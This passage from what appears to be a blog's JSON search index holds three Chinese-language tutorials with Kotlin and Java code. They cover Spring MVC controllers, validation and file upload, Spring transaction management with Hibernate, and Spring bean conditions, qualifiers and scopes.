","permalink":"https://xhstormr.github.io/blog/posts/java-concurrency/","summary":"","title":"Java Concurrency"},{"content":"Updated on 2017-06-22\nMappingJackson2HttpMessageConverter\nhttps://github.com/thymeleaf/thymeleaf\nhttp://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html\nConcept REST：将资源的 状态 以 适合 客户端的 格式 从服务端 传递 至客户端（或者反过来）。 资源通过 URL 进行标识，通过 HTTP Method 进行管理，通过 HTTP Header 表述格式。 资源：URL（统一资源定位器） 格式：Accept、Content-Type 头部信息。 动词：CRUD（增删改查） 幂等：同一操作 执行 任意次数 所产生的影响或结果 相同。 Configuration build.gradle.kts plugin(\u0026#34;war\u0026#34;) compile(\u0026#34;org.springframework:spring-webmvc:+\u0026#34;) compile(\u0026#34;javax.servlet:javax.servlet-api:+\u0026#34;) compile(\u0026#34;org.thymeleaf:thymeleaf-spring4:+\u0026#34;) compile(\u0026#34;org.slf4j:slf4j-jdk14:+\u0026#34;) compile(\u0026#34;org.hibernate:hibernate-validator:5.+\u0026#34;) compile(\u0026#34;com.fasterxml.jackson.core:jackson-databind:+\u0026#34;) Code AppConfig import org.springframework.web.filter.CharacterEncodingFilter import org.springframework.web.servlet.support.AbstractAnnotationConfigDispatcherServletInitializer import javax.servlet.Filter import javax.servlet.MultipartConfigElement import javax.servlet.ServletRegistration class AppConfig : AbstractAnnotationConfigDispatcherServletInitializer() { override fun getServletMappings(): Array\u0026lt;String\u0026gt; = arrayOf(\u0026#34;/\u0026#34;) override fun getRootConfigClasses(): Array\u0026lt;Class\u0026lt;*\u0026gt;\u0026gt; = arrayOf(RootConfig::class.java) override fun getServletConfigClasses(): Array\u0026lt;Class\u0026lt;*\u0026gt;\u0026gt; = arrayOf(WebConfig::class.java) override fun getServletFilters(): Array\u0026lt;Filter\u0026gt; = arrayOf(CharacterEncodingFilter(\u0026#34;UTF-8\u0026#34;, true)) 添加过滤器 override fun customizeRegistration(registration: ServletRegistration.Dynamic) { val mb = 1024 * 1024L 限制文件最大为 2 MB，请求最大为 4 MB registration.setMultipartConfig(MultipartConfigElement(\u0026#34;D:/TEMP\u0026#34;, 2 * mb, 4 * mb, 0)) } } WebConfig import org.springframework.context.annotation.Bean import org.springframework.context.annotation.ComponentScan import org.springframework.context.annotation.Configuration import org.springframework.format.FormatterRegistry import org.springframework.web.multipart.MultipartResolver import org.springframework.web.multipart.support.StandardServletMultipartResolver import org.springframework.web.servlet.ViewResolver import org.springframework.web.servlet.config.annotation.DefaultServletHandlerConfigurer import org.springframework.web.servlet.config.annotation.EnableWebMvc import org.springframework.web.servlet.config.annotation.InterceptorRegistry import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter import org.thymeleaf.spring4.SpringTemplateEngine import org.thymeleaf.spring4.view.ThymeleafViewResolver import org.thymeleaf.templateresolver.ITemplateResolver import org.thymeleaf.templateresolver.ServletContextTemplateResolver import javax.servlet.ServletContext @Configuration @EnableWebMvc 启用 Spring MVC @ComponentScan(\u0026#34;controller\u0026#34;) open class WebConfig : WebMvcConfigurerAdapter() { @Bean 1 open fun templateResolver(servletContext: ServletContext): ITemplateResolver = ServletContextTemplateResolver(servletContext).apply { this.characterEncoding = \u0026#34;UTF-8\u0026#34; this.prefix = \u0026#34;/WEB-INF/views/\u0026#34; this.suffix = \u0026#34;.html\u0026#34; } @Bean 2 open fun templateEngine(templateResolver: ITemplateResolver): SpringTemplateEngine = SpringTemplateEngine().apply { this.setTemplateResolver(templateResolver) } @Bean 3 open fun viewResolver(templateEngine: SpringTemplateEngine): ViewResolver = ThymeleafViewResolver().apply { this.characterEncoding = \u0026#34;UTF-8\u0026#34; this.templateEngine = templateEngine } @Bean open fun multipartResolver(): MultipartResolver = StandardServletMultipartResolver() 提供文件上传支持 override fun configureDefaultServletHandling(configurer: DefaultServletHandlerConfigurer) = configurer.enable() 提供静态资源访问（启用 DefaultServletHttpRequestHandler） override fun addInterceptors(registry: InterceptorRegistry) { registry.addInterceptor(MyInterceptor()).addPathPatterns(\u0026#34;/**\u0026#34;) 注册拦截器 } override fun addFormatters(registry: FormatterRegistry) { registry.addFormatter(MyDateFormatter()) 注册 Formatter registry.addConverter(MyStringToDateConverter()) 注册 Converter } } RootConfig import org.springframework.context.annotation.Configuration @Configuration open class RootConfig MyInterceptor import org.springframework.web.servlet.ModelAndView import org.springframework.web.servlet.handler.HandlerInterceptorAdapter import java.lang.Exception import javax.servlet.http.HttpServletRequest import javax.servlet.http.HttpServletResponse class MyInterceptor : HandlerInterceptorAdapter() { 拦截器 override fun preHandle(request: HttpServletRequest, response: HttpServletResponse, handler: Any): Boolean { println(\u0026#34;预处理\u0026#34;) return true 是否放行请求（true 放行，false 拦截） } override fun postHandle(request: HttpServletRequest, response: HttpServletResponse, handler: Any, modelAndView: ModelAndView?) { println(\u0026#34;后处理\u0026#34;) if (modelAndView != null) { modelAndView.model[\u0026#34;msg\u0026#34;] = \u0026#34;信息\u0026#34; } } override fun afterCompletion(request: HttpServletRequest, response: HttpServletResponse, handler: Any, ex: Exception?) { println(\u0026#34;请求结束\u0026#34;) } } 基于切面思想的应用： 过滤器：基于 Servlet 容器，能够过滤所有请求，使用回调函数。（Filter） 拦截器：基于 Spring 容器，只能拦截部分请求，使用反射机制。（Interceptor） MyDateFormatter import org.springframework.format.Formatter import java.text.SimpleDateFormat import java.util.* class MyDateFormatter : Formatter\u0026lt;Date\u0026gt; { Formatter：String \u0026lt;-\u0026gt; T private val sdf = SimpleDateFormat(\u0026#34;yyyy-MM-dd\u0026#34;) override fun parse(text: String, locale: Locale): Date = sdf.parse(text) override fun print(`object`: Date, locale: Locale): String = sdf.format(`object`) } MyStringToDateConverter import org.springframework.core.convert.converter.Converter import java.text.SimpleDateFormat import java.util.* class MyStringToDateConverter : Converter\u0026lt;String, Date\u0026gt; { Converter：S --\u0026gt; T private val sdf = SimpleDateFormat(\u0026#34;yyyy-MM-dd\u0026#34;) override fun convert(source: String): Date = sdf.parse(source) } entity Account package entity import javax.validation.constraints.Min import javax.validation.constraints.NotNull import javax.validation.constraints.Size data class Account( @field:NotNull 校验属性 @field:Size(min = 2, max = 4) var username: String? = null, @field:NotNull @field:Size(min = 6, max = 12) var password: String? = null, @field:NotNull @field:Min(18) var age: Int? = null ) controller HomeController package controller import org.springframework.stereotype.Controller import org.springframework.web.bind.annotation.RequestMapping import org.springframework.web.bind.annotation.RequestMethod @Controller 声明为控制器 @RequestMapping(\u0026#34;/\u0026#34;) 映射至 127.0.0.1:8080/ class HomeController { @RequestMapping(method = arrayOf(RequestMethod.GET)) 处理 GET 请求 fun home(): String { return \u0026#34;home\u0026#34; 解析为 /WEB-INF/views/home.html 视图 } } AController package controller import entity.Account import org.springframework.stereotype.Controller import org.springframework.ui.Model import org.springframework.validation.Errors import org.springframework.web.bind.annotation.* import org.springframework.web.multipart.MultipartFile import org.springframework.web.servlet.mvc.support.RedirectAttributes import java.io.File import javax.validation.Valid @Controller @RequestMapping(\u0026#34;/a\u0026#34;) class AController { 视图 查询参数：127.0.0.1:8080/a?username=张三\u0026amp;password=123456\u0026amp;age=20 @RequestMapping(method = arrayOf(RequestMethod.GET)) 可简化为 @GetMapping fun a(@RequestParam(defaultValue = \u0026#34;张三\u0026#34;) username: String, @RequestParam(defaultValue = \u0026#34;123456\u0026#34;) password: String, @RequestParam(defaultValue = \u0026#34;20\u0026#34;) age: Int, model: Model): String { if (!model.containsAttribute(\u0026#34;account\u0026#34;)) { 跨重定向请求传递复杂数据 model.addAttribute(\u0026#34;account\u0026#34;, Account(username, password, age)) 可简化为 model.addAttribute(Account(username, password, age)) 根据对象类型推断 Key } return \u0026#34;a\u0026#34; } 进一步简化：根据请求路径推断视图（a），根据对象类型推断 Key（account） @RequestMapping(method = arrayOf(RequestMethod.GET)) fun a(@RequestParam(defaultValue = \u0026#34;张三\u0026#34;) username: String, @RequestParam(defaultValue = \u0026#34;123456\u0026#34;) password: String, @RequestParam(defaultValue = \u0026#34;20\u0026#34;) age: Int): Account { return Account(username, password, age) } 路径变量：127.0.0.1:8080/a/张三/123456/20 @RequestMapping(path = arrayOf(\u0026#34;/{username}/{password}/{age}\u0026#34;), method = arrayOf(RequestMethod.GET)) fun b(@PathVariable username: String, @PathVariable password: String, @PathVariable age: Int, model: Model): String { if (!model.containsAttribute(\u0026#34;account\u0026#34;)) { model.addAttribute(Account(username, password, age)) } return \u0026#34;a\u0026#34; } 表单参数 @RequestMapping(path = arrayOf(\u0026#34;/form\u0026#34;), method = arrayOf(RequestMethod.POST)) fun c(@Valid account: Account, errors: Errors, model: Model): String { 校验属性 if (errors.hasErrors()) { 检查校验是否出错 return \u0026#34;redirect:/\u0026#34; 重定向（redirect:），请求转发（forward:） } model.addAttribute(\u0026#34;username\u0026#34;, account.username) 跨重定向请求传递简单数据 model.addAttribute(\u0026#34;password\u0026#34;, account.password) model.addAttribute(\u0026#34;age\u0026#34;, account.age) return \u0026#34;redirect:/a/{username}/{password}/{age}\u0026#34; 通过路径变量的形式传递数据：127.0.0.1:8080/a/张三/123456/20 或者 return \u0026#34;redirect:/a\u0026#34; 通过查询参数的形式传递数据：127.0.0.1:8080/a?username=张三\u0026amp;password=123456\u0026amp;age=20 } 跨重定向请求传递复杂数据： @RequestMapping(path = arrayOf(\u0026#34;/form\u0026#34;), method = arrayOf(RequestMethod.POST)) fun c(@Valid account: Account, errors: Errors, model: RedirectAttributes): String { if (errors.hasErrors()) { return \u0026#34;redirect:/\u0026#34; } model.addFlashAttribute(account) 跨重定向请求传递复杂数据 return \u0026#34;redirect:/a\u0026#34; 通过 flash 属性传递复杂数据 } 文件上传 @RequestMapping(path = arrayOf(\u0026#34;/upload\u0026#34;), method = arrayOf(RequestMethod.POST)) 可简化为 @PostMapping fun d(@RequestPart myPic: MultipartFile): String { myPic.transferTo(File(\u0026#34;D:/TEMP2/${myPic.originalFilename}\u0026#34;)) return \u0026#34;redirect:/\u0026#34; } 异常处理（作用于单个控制器） @ExceptionHandler(Throwable::class) fun handleError(): String { return \u0026#34;error\u0026#34; } } BController package controller import entity.Account import org.springframework.http.HttpStatus import org.springframework.http.MediaType import org.springframework.validation.Errors import org.springframework.web.bind.annotation.* import javax.validation.Valid @RestController 转换响应体(类级别)(ResponseBody + Controller) @RequestMapping(\u0026#34;/b\u0026#34;) class BController { REST API //@ResponseBody 转换响应体(方法级别) @RequestMapping(path = arrayOf(\u0026#34;/jsonOut\u0026#34;), method = arrayOf(RequestMethod.GET), produces = arrayOf(MediaType.APPLICATION_JSON_UTF8_VALUE)) 限制 Accept 头部信息 @ResponseStatus(HttpStatus.OK) 指定 HTTP 状态码 fun a(): Account { return Account(\u0026#34;张三\u0026#34;, \u0026#34;123456\u0026#34;, 20) } @RequestMapping(path = arrayOf(\u0026#34;/jsonInOut\u0026#34;), method = arrayOf(RequestMethod.POST), consumes = arrayOf(MediaType.APPLICATION_JSON_UTF8_VALUE)) 限制 Content-Type 头部信息 @ResponseStatus(HttpStatus.CREATED) fun b(@RequestBody @Valid account: Account, errors: Errors): Account { 转换请求体 if (errors.hasErrors()) { throw AccountNotFoundException(9527) } return account.apply { this.username = \u0026#34;李四\u0026#34; } } @ExceptionHandler(AccountNotFoundException::class) @ResponseStatus(HttpStatus.NOT_FOUND) fun handleError(e: AccountNotFoundException): Error { return Error(4, \u0026#34;账户 ${e.accountId} 未找到\u0026#34;) } } data class AccountNotFoundException( val accountId: Int ) : RuntimeException() data class Error( val code: Int, val message: String ) CController package controller import entity.Account import org.springframework.format.annotation.DateTimeFormat import org.springframework.web.bind.annotation.* import java.util.* @RestController @RequestMapping(\u0026#34;/c\u0026#34;) class CController { http://localhost:8080/c/base.do?age=123 Int ：Kotlin 编译为原始类型，参数必选 Int?：Kotlin 编译为包装类型，参数可选 @GetMapping(\u0026#34;/base.do\u0026#34;) fun base(age: Int?) = age.toString() Array http://localhost:8080/c/array.do?names=Tom\u0026amp;names=Lucy\u0026amp;names=Jim @GetMapping(\u0026#34;/array.do\u0026#34;) fun array(names: Array\u0026lt;String\u0026gt;) = Arrays.toString(names) Date http://localhost:8080/c/date.do?date=2017-07-15 默认时间格式为 DateFormat.SHORT：15/07/17 14:30 @GetMapping(\u0026#34;/date.do\u0026#34;) fun date(@DateTimeFormat(iso = DateTimeFormat.ISO.DATE) date: Date) = date Object http://localhost:8080/c/object.do /* { \u0026#34;username\u0026#34;: \u0026#34;张三\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123456\u0026#34;, \u0026#34;age\u0026#34;: 20 } */ @PostMapping(\u0026#34;/object.do\u0026#34;) fun `object`(@RequestBody account: Account) = account List,Set http://localhost:8080/c/list.do /* [ { \u0026#34;username\u0026#34;: \u0026#34;张三\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123456\u0026#34;, \u0026#34;age\u0026#34;: 20 }, { \u0026#34;username\u0026#34;: \u0026#34;张三\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123456\u0026#34;, \u0026#34;age\u0026#34;: 20 } ] */ @PostMapping(\u0026#34;/list.do\u0026#34;) fun list(@RequestBody accounts: List\u0026lt;Account\u0026gt;) = accounts Map http://localhost:8080/c/map.do /* { \u0026#34;a\u0026#34;: { \u0026#34;username\u0026#34;: \u0026#34;张三\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123456\u0026#34;, \u0026#34;age\u0026#34;: 20 }, \u0026#34;b\u0026#34;: { \u0026#34;username\u0026#34;: \u0026#34;张三\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123456\u0026#34;, \u0026#34;age\u0026#34;: 20 } } */ @PostMapping(\u0026#34;/map.do\u0026#34;) fun map(@RequestBody accounts: Map\u0026lt;String, Account\u0026gt;) = accounts } AppErrorHandler package controller import org.springframework.web.bind.annotation.ControllerAdvice import org.springframework.web.bind.annotation.ExceptionHandler @ControllerAdvice 控制器通知 class AppErrorHandler { @ExceptionHandler(Throwable::class) 异常处理（作用于所有控制器） fun handleError(): String { return \u0026#34;error\u0026#34; } } HTML a.html \u0026lt;html xmlns:th=\u0026#34;http://www.thymeleaf.org\u0026#34;\u0026gt; Thymeleaf 命名空间 \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p th:text=\u0026#34;${account}\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 变量表达式：${ }，基于 SpEL 表达式。 选择表达式：*{ }，基于选中对象。 路径表达式：@{ }。 对象表达式：#{ }。 b.html \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;/a/form\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34; type=\u0026#34;text\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input name=\u0026#34;password\u0026#34; type=\u0026#34;text\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input name=\u0026#34;age\u0026#34; type=\u0026#34;number\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; c.html \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;/a/upload\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; 以 multipart 格式提交表单 \u0026lt;input name=\u0026#34;myPic\u0026#34; type=\u0026#34;file\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ","permalink":"https://xhstormr.github.io/blog/posts/spring-mvc/","summary":"","title":"Spring MVC"},{"content":"Updated on 2017-06-15\nhttps://github.com/brettwooldridge/HikariCP\nhttps://docs.spring.io/spring/docs/current/javadoc-api/org/springframework/transaction/TransactionDefinition.html\nhttps://docs.spring.io/spring/docs/current/javadoc-api/org/springframework/transaction/annotation/Transactional.html\nConcept 事务的传播行为：Propagation 作用：解决业务层中方法之间互相调用而产生的事务如何传递的问题。 在 相同 事务中：REQUIRED 在 不同 事务中：REQUIRES_NEW 在 嵌套 事务中：NESTED 事务的隔离级别：Isolation 只读事务：readOnly 作用：禁止 增删改 操作。 发生异常 回滚事务：-Exception 发生异常不回滚事务：+Exception Configuration build.gradle.kts compile(\u0026#34;org.springframework:spring-orm:+\u0026#34;) compile(\u0026#34;org.springframework:spring-context:+\u0026#34;) compile(\u0026#34;com.zaxxer:HikariCP:+\u0026#34;) compile(\u0026#34;org.slf4j:slf4j-jdk14:+\u0026#34;) compile(\u0026#34;org.postgresql:postgresql:+\u0026#34;) compile(\u0026#34;org.hibernate:hibernate-core:+\u0026#34;) compile(\u0026#34;org.hibernate:hibernate-hikaricp:+\u0026#34;) compile(\u0026#34;org.hibernate:hibernate-infinispan:+\u0026#34;) hibernate.properties hibernate.show_sql=true hibernate.format_sql=false hibernate.hbm2ddl.auto=update hibernate.dialect=org.hibernate.dialect.PostgreSQL95Dialect hibernate.current_session_context_class=org.springframework.orm.hibernate5.SpringSessionContext hibernate.connection.provider_class=org.hibernate.hikaricp.internal.HikariCPConnectionProvider hibernate.hikari.dataSourceClassName=org.postgresql.ds.PGSimpleDataSource hibernate.hikari.dataSource.url=jdbc:postgresql://127.0.0.1:5432/postgres hibernate.hikari.username=123 hibernate.hikari.password=123456 #hibernate.hikari.driverClassName=org.postgresql.Driver #hibernate.hikari.jdbcUrl=jdbc:postgresql://127.0.0.1:5432/postgres hibernate.cache.use_query_cache=true hibernate.cache.region.factory_class=org.hibernate.cache.infinispan.InfinispanRegionFactory hibernate.cache.infinispan.cfg=org/hibernate/cache/infinispan/builder/infinispan-configs-local.xml hibernate.cfg.xml \u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#39;utf-8\u0026#39;?\u0026gt; \u0026lt;!DOCTYPE hibernate-configuration PUBLIC \u0026#34;-//Hibernate/Hibernate Configuration DTD//EN\u0026#34; \u0026#34;http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd\u0026#34;\u0026gt; \u0026lt;hibernate-configuration\u0026gt; \u0026lt;session-factory\u0026gt; \u0026lt;mapping class=\u0026#34;entity.Account\u0026#34;/\u0026gt; \u0026lt;/session-factory\u0026gt; \u0026lt;/hibernate-configuration\u0026gt; 编程式事务管理 基于 TransactionTemplate entity Account package entity import org.hibernate.annotations.Cache import org.hibernate.annotations.CacheConcurrencyStrategy import javax.persistence.* @Entity @Cache(usage = CacheConcurrencyStrategy.READ_WRITE) 使用二级缓存 data class Account( @Id @GeneratedValue(strategy = GenerationType.IDENTITY) val id: Int? = null, var name: String? = null, var money: Int = 0 ) Hibernate 缓存策略： 一级缓存：强制开启，以 Session 为单位。 二级缓存：默认关闭，以 SessionFactory 为单位。 dao AccountDao package dao interface AccountDao { fun outMoney(id: Int, money: Int) fun inMoney(id: Int, money: Int) } AccountDaoImpl package dao import entity.Account import org.springframework.beans.factory.annotation.Autowired import org.springframework.orm.hibernate5.HibernateTemplate import org.springframework.stereotype.Component @Component open class AccountDaoImpl : AccountDao { @Autowired private lateinit var hibernateTemplate: HibernateTemplate override fun outMoney(id: Int, money: Int) { val account = hibernateTemplate.get(Account::class.java, id).apply { this.money -= money } hibernateTemplate.update(account) } override fun inMoney(id: Int, money: Int) { val account = hibernateTemplate.get(Account::class.java, id).apply { this.money += money } hibernateTemplate.update(account) } } service AccountService package service interface AccountService { fun transfer(out: Int, `in`: Int, money: Int) } AccountServiceImpl package service import dao.AccountDao import org.springframework.beans.factory.annotation.Autowired import org.springframework.stereotype.Component import org.springframework.transaction.support.TransactionTemplate @Component open class AccountServiceImpl : AccountService { @Autowired private lateinit var accountDao: AccountDao @Autowired private lateinit var transactionTemplate: TransactionTemplate 注入事务管理模板 override fun transfer(out: Int, `in`: Int, money: Int) { transactionTemplate.execute { 在同一个事务中执行 accountDao.outMoney(out, money) accountDao.inMoney(`in`, money) } } } AppConfig import org.hibernate.SessionFactory import org.hibernate.boot.MetadataSources import org.hibernate.boot.registry.StandardServiceRegistryBuilder import org.springframework.context.annotation.Bean import org.springframework.context.annotation.ComponentScan import org.springframework.context.annotation.Configuration import org.springframework.orm.hibernate5.HibernateTemplate import org.springframework.orm.hibernate5.HibernateTransactionManager import org.springframework.transaction.support.TransactionTemplate @Configuration @ComponentScan(basePackages = arrayOf(\u0026#34;dao\u0026#34;, \u0026#34;service\u0026#34;)) open class AppConfig { @Bean open fun sessionFactory(): SessionFactory { val registry = StandardServiceRegistryBuilder().configure().build() return MetadataSources(registry).buildMetadata().buildSessionFactory() } @Bean open fun hibernateTemplate(sessionFactory: SessionFactory): HibernateTemplate { return HibernateTemplate(sessionFactory) } @Bean open fun transactionManager(sessionFactory: SessionFactory): HibernateTransactionManager { return HibernateTransactionManager(sessionFactory) } ---- @Bean open fun transactionTemplate(transactionManager: HibernateTransactionManager): TransactionTemplate { return TransactionTemplate(transactionManager) 事务管理模板 } } Main import entity.Account import org.hibernate.SessionFactory import org.springframework.context.annotation.AnnotationConfigApplicationContext import service.AccountService fun main(args: Array\u0026lt;String\u0026gt;) { System.setProperty(\u0026#34;java.net.preferIPv4Stack\u0026#34;, \u0026#34;true\u0026#34;) val context = AnnotationConfigApplicationContext(AppConfig::class.java) context.getBean(SessionFactory::class.java).openSession().use { it.beginTransaction() it.save(Account(name = \u0026#34;张三\u0026#34;, money = 1000)) it.save(Account(name = \u0026#34;李四\u0026#34;, money = 1000)) it.save(Account(name = \u0026#34;王五\u0026#34;, money = 1000)) it.transaction.commit() } context.getBean(AccountService::class.java).transfer(1, 2, 400) context.destroy() } 声明式事务管理 基于 TransactionProxyFactoryBean 略 service.AccountServiceImpl package service import dao.AccountDao import org.springframework.beans.factory.annotation.Autowired import org.springframework.stereotype.Component @Component open class AccountServiceImpl : AccountService { @Autowired private lateinit var accountDao: AccountDao override fun transfer(out: Int, `in`: Int, money: Int) { accountDao.outMoney(out, money) accountDao.inMoney(`in`, money) } } AppConfig import org.hibernate.SessionFactory import org.hibernate.boot.MetadataSources import org.hibernate.boot.registry.StandardServiceRegistryBuilder import org.springframework.context.annotation.Bean import org.springframework.context.annotation.ComponentScan import org.springframework.context.annotation.Configuration import org.springframework.orm.hibernate5.HibernateTemplate import org.springframework.orm.hibernate5.HibernateTransactionManager import org.springframework.transaction.interceptor.TransactionProxyFactoryBean import service.AccountService import java.util.* @Configuration @ComponentScan(basePackages = arrayOf(\u0026#34;dao\u0026#34;, \u0026#34;service\u0026#34;)) open class AppConfig { @Bean open fun sessionFactory(): SessionFactory { val registry = StandardServiceRegistryBuilder().configure().build() return MetadataSources(registry).buildMetadata().buildSessionFactory() } @Bean open fun hibernateTemplate(sessionFactory: SessionFactory): HibernateTemplate { return HibernateTemplate(sessionFactory) } @Bean open fun transactionManager(sessionFactory: SessionFactory): HibernateTransactionManager { return HibernateTransactionManager(sessionFactory) } ---- @Bean open fun accountServiceProxy(accountService: AccountService, transactionManager: HibernateTransactionManager): TransactionProxyFactoryBean { return TransactionProxyFactoryBean().apply { 代理对象 this.setTarget(accountService) 设置目标对象（增强对象） this.setTransactionManager(transactionManager) 设置事务管理器 this.setTransactionAttributes(Properties().apply { this[\u0026#34;*\u0026#34;] = \u0026#34;PROPAGATION_REQUIRED\u0026#34; }) 设置事务属性 } } } Main import entity.Account import org.hibernate.SessionFactory import org.springframework.context.annotation.AnnotationConfigApplicationContext import service.AccountService fun main(args: Array\u0026lt;String\u0026gt;) { System.setProperty(\u0026#34;java.net.preferIPv4Stack\u0026#34;, \u0026#34;true\u0026#34;) val context = AnnotationConfigApplicationContext(AppConfig::class.java) context.getBean(SessionFactory::class.java).openSession().use { it.beginTransaction() it.save(Account(name = \u0026#34;张三\u0026#34;, money = 1000)) it.save(Account(name = \u0026#34;李四\u0026#34;, money = 1000)) it.save(Account(name = \u0026#34;王五\u0026#34;, money = 1000)) it.transaction.commit() } context.getBean(\u0026#34;accountServiceProxy\u0026#34;, AccountService::class.java).transfer(1, 2, 400) 使用代理对象 context.destroy() } 基于注解（推荐） 略 service.AccountServiceImpl package service import dao.AccountDao import org.springframework.beans.factory.annotation.Autowired import org.springframework.stereotype.Component import org.springframework.transaction.annotation.Transactional @Component @Transactional 使用事务 open class AccountServiceImpl : AccountService { @Autowired private lateinit var accountDao: AccountDao override fun transfer(out: Int, `in`: Int, money: Int) { accountDao.outMoney(out, money) accountDao.inMoney(`in`, money) } } AppConfig import org.hibernate.SessionFactory import org.hibernate.boot.MetadataSources import org.hibernate.boot.registry.StandardServiceRegistryBuilder import org.springframework.context.annotation.Bean import org.springframework.context.annotation.ComponentScan import org.springframework.context.annotation.Configuration import org.springframework.orm.hibernate5.HibernateTemplate import org.springframework.orm.hibernate5.HibernateTransactionManager import org.springframework.transaction.annotation.EnableTransactionManagement @Configuration @EnableTransactionManagement 启用注解驱动的事务管理 @ComponentScan(basePackages = arrayOf(\u0026#34;dao\u0026#34;, \u0026#34;service\u0026#34;)) open class AppConfig { @Bean open fun sessionFactory(): SessionFactory { val registry = StandardServiceRegistryBuilder().configure().build() return MetadataSources(registry).buildMetadata().buildSessionFactory() } @Bean open fun hibernateTemplate(sessionFactory: SessionFactory): HibernateTemplate { return HibernateTemplate(sessionFactory) } @Bean open fun transactionManager(sessionFactory: SessionFactory): HibernateTransactionManager { return HibernateTransactionManager(sessionFactory) } } Main import entity.Account import org.hibernate.SessionFactory import org.springframework.context.annotation.AnnotationConfigApplicationContext import service.AccountService fun main(args: Array\u0026lt;String\u0026gt;) { System.setProperty(\u0026#34;java.net.preferIPv4Stack\u0026#34;, \u0026#34;true\u0026#34;) val context = AnnotationConfigApplicationContext(AppConfig::class.java) context.getBean(SessionFactory::class.java).openSession().use { it.beginTransaction() it.save(Account(name = \u0026#34;张三\u0026#34;, money = 1000)) it.save(Account(name = \u0026#34;李四\u0026#34;, money = 1000)) it.save(Account(name = \u0026#34;王五\u0026#34;, money = 1000)) it.transaction.commit() } context.getBean(AccountService::class.java).transfer(1, 2, 400) context.destroy() } ","permalink":"https://xhstormr.github.io/blog/posts/spring-transaction/","summary":"","title":"Spring Transaction"},{"content":"Updated on 2017-06-07\nBean 的条件化注册 MyCondition import org.springframework.context.annotation.Condition; import org.springframework.context.annotation.ConditionContext; import org.springframework.core.env.Environment; import org.springframework.core.type.AnnotatedTypeMetadata; public class MyCondition implements Condition { @Override public boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata) { Environment environment = context.getEnvironment(); return environment.getProperty(\u0026#34;OS\u0026#34;).equals(\u0026#34;Windows_NT\u0026#34;); 注册条件 } } AppConfig import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Conditional; import org.springframework.context.annotation.Configuration; @Configuration public class AppConfig { @Bean @Conditional(MyCondition.class) 指示注册条件 public String str() { return \u0026#34;Hello, Windows\u0026#34;; } } Main import org.springframework.context.annotation.AnnotationConfigApplicationContext; public class Main { public static void main(String[] args) { AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(AppConfig.class); System.out.println(context.containsBean(\u0026#34;str\u0026#34;)); context.destroy(); } } ---- 输出： true Bean 的装配歧义 food.Dessert package food; import org.springframework.context.annotation.Primary; import org.springframework.stereotype.Component; public interface Dessert { } @Component @Primary 首选（也可用在 @Bean 上） @Qualifier(\u0026#34;cake\u0026#34;) 限定（也可用在 @Bean 上）（显式指定 Bean 的限定符） class Cake implements Dessert { } @Component class IceCream implements Dessert { } AppConfig import food.Dessert; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.beans.factory.annotation.Qualifier; import org.springframework.context.annotation.ComponentScan; import org.springframework.context.annotation.Configuration; @Configuration @ComponentScan(\u0026#34;food\u0026#34;) public class AppConfig { private Dessert dessert; @Autowired @Qualifier(\u0026#34;cake\u0026#34;) 限定（也可用在 @Bean 上） public void setDessert(Dessert dessert) { this.dessert = dessert; } } Bean 的限定符的缺省值为 Bean 的名称； Bean 的一名称的缺省值为 Bean 的类名（@Component）或者方法名（@Bean）。 Bean 的作用域 单例：每个 容器 创建一个。（Singleton）（默认） 原型：每次 注入 创建一个。（Prototype） 会话：每个 会话 创建一个。（Session） 请求：每个 请求 创建一个。（Request） AppConfig import org.springframework.beans.factory.config.ConfigurableBeanFactory; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.context.annotation.Scope; @Configuration public class AppConfig { @Bean @Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE) 指示每次注入都新创建一个（也可用在 @Component 上） public String str() { return new String(\u0026#34;ABC\u0026#34;); } } Main import org.springframework.context.annotation.AnnotationConfigApplicationContext; public class Main { public static void main(String[] args) { AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(AppConfig.class); System.out.println(context.getBean(\u0026#34;str\u0026#34;) == context.getBean(\u0026#34;str\u0026#34;)); context.destroy(); } } ---- 输出： false 运行时值注入 123.properties name=David AppConfig 